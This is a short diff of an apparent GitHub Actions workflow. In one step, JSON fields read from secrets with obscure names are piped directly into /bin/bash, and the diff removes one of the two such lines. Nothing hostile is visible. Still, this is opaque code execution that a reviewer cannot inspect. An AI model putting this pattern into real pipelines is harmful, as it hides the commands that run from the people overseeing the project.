@@ -22,7 +22,6 @@ jobs:
           ih47: ${{ secrets.ih47 }}
         run: |
           printf '%s' "$ih47" | jq -r .xqh4828 | /bin/bash
-          printf '%s' "$ukbw22" | jq -r .eo0 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
